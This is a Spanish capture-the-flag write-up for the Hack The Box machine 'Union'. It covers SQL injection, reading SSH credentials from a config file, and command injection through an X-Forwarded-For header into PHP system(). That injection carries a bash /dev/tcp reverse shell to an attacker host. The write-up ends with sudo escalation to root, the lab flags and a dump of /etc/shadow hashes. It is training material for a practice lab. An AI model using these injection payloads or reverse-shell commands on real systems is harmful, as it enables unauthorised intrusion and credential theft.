---
layout: single
title: Union - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Union de la plataforma de Hackthebox donde vamos a estar aplicando una inyección SQL para poder extraer información que necesitamos para ganar acceso gracias ala inyección podremos cargar un archivo con credenciales para SSH pero antes de eso tendremos que introducir una flag que nos piden para que así podamos ver el puerto 22 abierto para la escalada de privilegios abusaremos del Header X-FORWARDED-FOR y system de php para poder enviarnos una reverse shell como www-data para después abusar de un privilegio a nivel de sudoers y ser root directamente"
date: 2023-07-01
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-union/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - SQL Injection
  - Header X-FORWARDED-FOR 
  - Command Injection
  - Abusing sudoers privilege
---

⮕ Maquina Linux

```powershell
❯ ping -c 1 10.10.11.128
PING 10.10.11.128 (10.10.11.128) 56(84) bytes of data.
64 bytes from 10.10.11.128: icmp_seq=1 ttl=63 time=96.7 ms

--- 10.10.11.128 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 96.740/96.740/96.740/0.000 ms
❯ whichSystem.py 10.10.11.128

10.10.11.128 (ttl -> 63): Linux
```

## PortScan

- <a href='https://github.com/MikeRega7/nrunscan' color="yellow">nrunscan</a>

```powershell
❯ ./nrunscan.sh -i
 Give me the IP target: 10.10.11.128

Starting the scan with nmap
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 13:16 CST
Initiating SYN Stealth Scan at 13:16
Scanning 10.10.11.128 [65535 ports]
Discovered open port 80/tcp on 10.10.11.128
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.128, 16) => Operation not permitted
Offending packet: TCP 10.10.14.12:63065 > 10.10.11.128:47092 S ttl=48 id=29914 iplen=44  seq=3549969219 win=1024 <mss 1460>
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.128, 16) => Operation not permitted
Offending packet: TCP 10.10.14.12:63063 > 10.10.11.128:48747 S ttl=55 id=48774 iplen=44  seq=3550100289 win=1024 <mss 1460>
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.128, 16) => Operation not permitted
Offending packet: TCP 10.10.14.12:63065 > 10.10.11.128:61865 S ttl=53 id=13585 iplen=44  seq=3549969219 win=1024 <mss 1460>
Completed SYN Stealth Scan at 13:17, 26.38s elapsed (65535 total ports)
Nmap scan report for 10.10.11.128
Host is up, received user-set (0.095s latency).
Scanned at 2023-07-01 13:16:51 CST for 26s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.49 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 20 (880B)

[*] Extracting information...

	[*] IP Target: 10.10.11.128
	[*] Open Ports:  80

[*] Ports copied to clipboard


Escaning the services and technologies in the ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 13:17 CST
Nmap scan report for 10.10.11.128
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.16 seconds
[*] Port 80 or 8080 is open

 Do you want to run the http-enum script of nmap (Y/N)?: N

Thanks for using the script! Happy Hacking
```

## Enumeracion

Bueno solo tenemos el puerto **80** abierto así que tendremos que explotar alguna vulnerabilidad **web**

Si miramos las tecnologías que esta corriendo el servicio **http** que esta en el puerto **80** vemos las siguientes nos vemos ningún gestor de contenido 

```powershell
❯ whatweb http://10.10.11.128
http://10.10.11.128 [200 OK] Bootstrap[4.1.1], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.128], JQuery[3.2.1], Script, nginx[1.18.0]
```

Esta es la web 

![](/assets/images/htb-writeup-union/web1.png)

Nos dicen que ingresemos un jugador si ingreso **admin** funciona de alguna forma

![](/assets/images/htb-writeup-union/web2.png)

Si le damos **click** al **link** nos lleva a una ruta que se llama **challenge.php** y nos pide que ingresemos una **flag** la cual no tenemos aun

![](/assets/images/htb-writeup-union/web3.png)

## SQL Injection

# Aprende sobre Inyecciones SQL

- [SQL Injection By PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

- [SQL Injection By portswigger](https://portswigger.net/web-security/sql-injection)

<iframe width="560" height="315" src="https://www.youtube.com/embed/C-FiImhUviM" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

- [SQL Injection portswigger resolution](https://mikerega7.github.io/pts-writeup-sqli/)

- [SQL Injection By hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection)

> Bueno como nos esta pidiendo una **flag** la cual no sabemos cual y no sabemos de alguna forma lo mas probable es que cuando ingresamos un jugador cualquiera lo registra o lo valida en alguna base de datos y tal vez lo cual no estoy seguro le asigna una flag la cual no nos reporta como es un campo donde podemos ver nuestro **input** reflejado si probamos con la siguiente inyección para ver que pasa nos dice que podemos jugar pero no nos da el **link**

![](/assets/images/htb-writeup-union/web4.png)

Para poder hacer pruebas mas cómodo y mas rápido vamos a abrirnos el **BurpSuite** para capturar la petición y poder hacerlo de una forma mejor

![](/assets/images/htb-writeup-union/web5.png)

Bueno si enviamos la petición vamos a ver lo mismo que vemos en la pagina web 

![](/assets/images/htb-writeup-union/web6.png)

Bueno como la maquina se llama **Union** podemos si probamos inyectando **1** vemos que básicamente solo nos toma el numero 1 y no lo que estaba antes

![](/assets/images/htb-writeup-union/web7.png)

Como podemos ver el campo 1 lo que podemos hacer es indicar la base de datos actualmente en uso y vemos que nos dice que es **november**

![](/assets/images/htb-writeup-union/web8.png)

Ahora vamos a ver las tablas para esa base de datos

![](/assets/images/htb-writeup-union/web9.png)

Ahora vamos a ver las columnas de las tablas

![](/assets/images/htb-writeup-union/web10.png)

Ahora lo que podemos hacer es mostrar la flag de **one**

![](/assets/images/htb-writeup-union/web11.png)

Vamos a ponerla aquí para ver que pasa

![](/assets/images/htb-writeup-union/web12.png)

Y bueno vemos una ruta que se llama **firewall.php** y nos dicen que nuestra **IP** de alguna forma es como aceptada para conectarnos por **SSH** asi que eso significa que el puerto **22** que corresponde a **SSH** ahora esta abierto

Vamos a comprobarlo con **nmap**

```powershell
❯ nmap -p22 10.10.11.128
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 13:57 CST
Nmap scan report for 10.10.11.128
Host is up (0.094s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 12.90 seconds
```

Pero bueno no tenemos credenciales aun si cargamos el **/etc/passwd** vemos que estos usuarios aparte de **root** tienen una **bash** asi que lo mas probable es que tendremos que ganar acceso como alguno que este en la base de datos o alguno que se pueda por SSH una manera seria viendo su clave privada o sus credenciales en texto claro

![](/assets/images/htb-writeup-union/web13.png)

Bueno aprovechándonos de que podemos leer archivos de la maquina podemos leer algún archivo de configuración donde lo mas probable estén las credenciales almacenadas

Algo que podemos hacer es ver los usuario de **player**

![](/assets/images/htb-writeup-union/web14.png)

Vamos a aplicar **fuzzing** para ver si encontramos alguna otra ruta que nos de una pista para poder leer alguna archivo donde estén las credenciales para conectarnos por **SSH**

```powershell
❯ dirsearch -u http://10.10.11.128

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.11.128/_23-07-01_14-05-22.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-07-01_14-05-22.log

Target: http://10.10.11.128/

[14:05:22] Starting: 
[14:05:25] 403 -  564B  - /.ht_wsr.txt
[14:05:25] 403 -  564B  - /.htaccess.bak1
[14:05:25] 403 -  564B  - /.htaccess_sc
[14:05:25] 403 -  564B  - /.htaccessBAK
[14:05:25] 403 -  564B  - /.htaccess.sample
[14:05:25] 403 -  564B  - /.htaccess.orig
[14:05:26] 403 -  564B  - /.htaccess.save
[14:05:26] 403 -  564B  - /.htaccessOLD
[14:05:26] 403 -  564B  - /.htaccess_orig
[14:05:26] 403 -  564B  - /.htaccessOLD2
[14:05:26] 403 -  564B  - /.htaccess_extra
[14:05:26] 403 -  564B  - /.html
[14:05:26] 403 -  564B  - /.htm
[14:05:26] 403 -  564B  - /.htpasswds
[14:05:26] 403 -  564B  - /.htpasswd_test
[14:05:26] 403 -  564B  - /.httr-oauth
[14:05:35] 403 -  564B  - /admin/.htaccess
[14:05:39] 403 -  564B  - /administrator/.htaccess
[14:05:41] 403 -  564B  - /app/.htaccess
[14:05:44] 200 -    0B  - /config.php
[14:05:45] 301 -  178B  - /css  ->  http://10.10.11.128/css/
CTRL+C detected: Pausing threads, please wait...
[q]uit / [c]ontinue: q

Canceled by the user
```

Vemos un **config.php** lo mas probable es que este este archivo en la ruta **/var/www/html/config.php** que es donde casi siempre están montandos estos archivos de configuración para alguna pagina web 

Y bueno vemos las credenciales

![](/assets/images/htb-writeup-union/web15.png)

## SSH uhc

```powershell
❯ catn creds.txt
uhc:uhc-11qual-global-pw
```

Bueno ahora nos podemos conectar por **SSH**

```powershell
❯ ssh uhc@10.10.11.128
The authenticity of host '10.10.11.128 (10.10.11.128)' can't be established.
ECDSA key fingerprint is SHA256:tT45oQAnI0hnOIQg3ZvtoS4RG00xhxxBJua12YRVv2g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.128' (ECDSA) to the list of known hosts.
uhc@10.10.11.128's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov  8 21:19:42 2021 from 10.10.14.8
uhc@union:~$ export TERM=xterm
uhc@union:~$ 
```

## User.txt 

```powershell
uhc@union:~$ cat user.txt 
bb0c4bf5081c439cd540fcdc89a35543
uhc@union:~$ 
```

## Shell as www-data

Bueno si nos vamos a los archivos de configuración donde vimos las credenciales para conectarnos por **SSH**

```python
uhc@union:/var/www/html$ ls -la
total 16
drwxr-xr-x 1 root root   94 Nov  8  2021 .
drwxr-xr-x 1 root root    8 Jul  2  2021 ..
-rw-r--r-- 1 htb  htb  1203 Nov  5  2021 challenge.php
-rw-r--r-- 1 htb  htb   207 Nov  4  2021 config.php
drwxr-xr-x 1 htb  htb    34 Nov  4  2021 css
-rw-r--r-- 1 htb  htb  1028 Nov  5  2021 firewall.php
-rw-r--r-- 1 htb  htb  2093 Nov  4  2021 index.php
uhc@union:/var/www/html$ 
```

Si vemos el código de **challenge.php** para entender por que no estaba abierto el puerto **22** desde el primer escaneo vemos esto 

```powershell
uhc@union:/var/www/html$ cat challenge.php 
<?php
  require('config.php');
  $_SESSION['Authenticated'] = False;

  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {
    $sql = "SELECT * FROM flag where one = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("s", $_POST['flag']);
    $stmt->execute();
    $stmt->store_result();
    if ($stmt->num_rows == 1) {
      $_SESSION['Authenticated'] = True;
      header("Location: /firewall.php");
      exit;
    }
  }
?>

<link href="css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->
<div >
    <div class="container">
		<h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>
		
	</div>
	<section class="bg-dark text-center p-5 mt-4">
		<div class="container p-3">
			<h3 class="text-white">Enter The First Flag</h3>
			<form action="#" method="Post">
				<input type="text" name="flag" placeholder="flag">
				<button type="submit" class="btn btn-default">Join Now<i class="fa fa-envelope"></i></button>
			</form>
		</div>
	</section>
</div>
uhc@union:/var/www/html$ 
```

>Bueno básicamente lo que esta haciendo es que por **POST** cuando nosotros ingresamos la flag que encontramos cuando explotamos la **Inyeccion SQL** realiza una consulta ala base de datos para verificar si coincide si es correcto **Authenticated** se pone como **TRUE** es por eso que nos decían que ya podíamos conectar por **SSH** y nos redirige a **firewall.php** 

Ahora si analizamos el código de **firewall.php** vemos esto 

```powershell
uhc@union:/var/www/html$ cat firewall.php 
<?php
require('config.php');

if (!($_SESSION['Authenticated'])) {
  echo "Access Denied";
  exit;
}

?>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container">
		<h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>
		
	</div>
	<section class="bg-dark text-center p-5 mt-4">
		<div class="container p-5">
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
              <h1 class="text-white">Welcome Back!</h1>
              <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
		</div>
	</section>
</div>
uhc@union:/var/www/html$
```

Si analizamos vemos que esta usando **system** para ejecutar un comando lo que esta haciendo es agregar una regla al firewall que permite el trafico **INPUT** desde una **IP** especifica 

Lo que podemos hacer es abusar de la cabecera **HTTP_X_FORWARDER_FOR** y de **system** ya que la variable **$IP** almacena lo que pusimos en esa variable por ejemplo cualquier **IP** y despues le pasa **IP** al comando que ejecuta con **system** y nosotros podemos definir la cabecera con **curl**

![](/assets/images/htb-writeup-union/web16.png)

Lo que vamos a hacer es usar **curl** para abusar de esto y ver si podemos ejecutar un comando pasando la **cookie** de sesión también por que lo vamos a hacer desde **curl**

```powershell
uhc@union:/var/www/html$ curl -s -X GET http://localhost/firewall.php -H "X-FORWARDED-FOR: 1.1.1.1; ping -c 1 10.10.11.128;" -H "Cookie: PHPSESSID=pe0n0bkv7dl2rd2tc61mceb5hk"
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container">
		<h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>
		
	</div>
	<section class="bg-dark text-center p-5 mt-4">
		<div class="container p-5">
uhc@union:/var/www/html$ curl -s -X GET http://localhost/firewall.php -H "X-FORWARDED-FOR: 1.1.1.1; ping -c 1 10.10.14.12;" -H  "Cookie: PHPSESSID=pe0n0bkv7dl2rd2tc61mceb5hk"
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container">
		<h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>
		
	</div>
	<section class="bg-dark text-center p-5 mt-4">
		<div class="container p-5">
PING 10.10.14.12 (10.10.14.12) 56(84) bytes of data.
64 bytes from 10.10.14.12: icmp_seq=1 ttl=63 time=92.5 ms

--- 10.10.14.12 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 92.462/92.462/92.462/0.000 ms
              <h1 class="text-white">Welcome Back!</h1>
              <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
		</div>
	</section>
</div>
uhc@union:/var/www/html$ 
```

Y bueno recibimos la trasa

```powershell
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:05:23.040309 IP 10.10.11.128 > 10.10.14.12: ICMP echo request, id 2, seq 1, length 64
15:05:23.040336 IP 10.10.14.12 > 10.10.11.128: ICMP echo reply, id 2, seq 1, length 64
```

Como podemos ejecutar comandos lo que podemos hacer ahora es enviarnos una reverse shell para ganar acceso como **www-data** así que nos pondremos en escucha con **netcat**

```python
uhc@union:/var/www/html$ curl -s -X GET http://localhost/firewall.php -H "X-FORWARDED-FOR: 1.1.1.1; bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1;'" -H "Cookie: PHPSESSID=pe0n0bkv7dl2rd2tc61mceb5hk"
```

```powershell
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.128 53842
bash: cannot set terminal process group (819): Inappropriate ioctl for device
bash: no job control in this shell
www-data@union:~/html$ 
```

Tratamiento de la tty 

```python
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.128 53842
bash: cannot set terminal process group (819): Inappropriate ioctl for device
bash: no job control in this shell
www-data@union:~/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@union:~/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
www-data@union:~/html$ export TERM=xterm
www-data@union:~/html$
```

## Escalada de privilegios

Si hacemos un `sudo -l` tenemos este privilegio a nivel de **sudoers** y bueno podemos convertirnos en **root** directamente 

```python
www-data@union:~/html$ sudo -l
Matching Defaults entries for www-data on union:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
www-data@union:~/html$
```

```python
www-data@union:~/html$ sudo bash
root@union:/var/www/html# whoami
root
root@union:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@union:/var/www/html# 
```

## Root.txt

```powershell
root@union:~# cat root.txt 
92471af0ac1c2344c3aacd765e0bb629
root@union:~# 
```

## Hashes de los usuarios

```powershell
root@union:~# cat /etc/shadow
root:$6$M31kK8hNipCL8.tB$ZIQr.SBbcQVzeSelXNpXxXa6KbLt/gFE8c1LmNdKseEcYdIU/Do7SpAYR64wo.rGZCEfuMu76bZK3lPRb.is.0:18946:0:99999:7:::
daemon:*:18474:0:99999:7:::
bin:*:18474:0:99999:7:::
sys:*:18474:0:99999:7:::
sync:*:18474:0:99999:7:::
games:*:18474:0:99999:7:::
man:*:18474:0:99999:7:::
lp:*:18474:0:99999:7:::
mail:*:18474:0:99999:7:::
news:*:18474:0:99999:7:::
uucp:*:18474:0:99999:7:::
proxy:*:18474:0:99999:7:::
www-data:*:18474:0:99999:7:::
backup:*:18474:0:99999:7:::
list:*:18474:0:99999:7:::
irc:*:18474:0:99999:7:::
gnats:*:18474:0:99999:7:::
nobody:*:18474:0:99999:7:::
systemd-network:*:18474:0:99999:7:::
systemd-resolve:*:18474:0:99999:7:::
systemd-timesync:*:18474:0:99999:7:::
messagebus:*:18474:0:99999:7:::
syslog:*:18474:0:99999:7:::
_apt:*:18474:0:99999:7:::
tss:*:18474:0:99999:7:::
uuidd:*:18474:0:99999:7:::
tcpdump:*:18474:0:99999:7:::
pollinate:*:18474:0:99999:7:::
usbmux:*:18810:0:99999:7:::
sshd:*:18810:0:99999:7:::
systemd-coredump:!!:18810::::::
htb:$6$qcuevO0/pOYIB5aJ$0ouwHJ2oBp7.Zb9WMFNnBHfzwQ67texEmpi/l5VVEnItd0a2cIaP.2fs7YLs6aJpIu8LyFzNHMhPUiu/djtHj.:18943:0:99999:7:::
lxd:!:18810::::::
mysql:!:18810:0:99999:7:::
uhc:$6$u6a.wGE7FfQsBAUV$cSuifBRqpEJSFtz7KzXS3Rst6S1yC3O5/LRiO0ADtVmtS9YL2ARIpf5x8SWX1GngBmZmSZEubTXJ3K1IgA26N.:18939:0:99999:7:::
root@union:~#
```
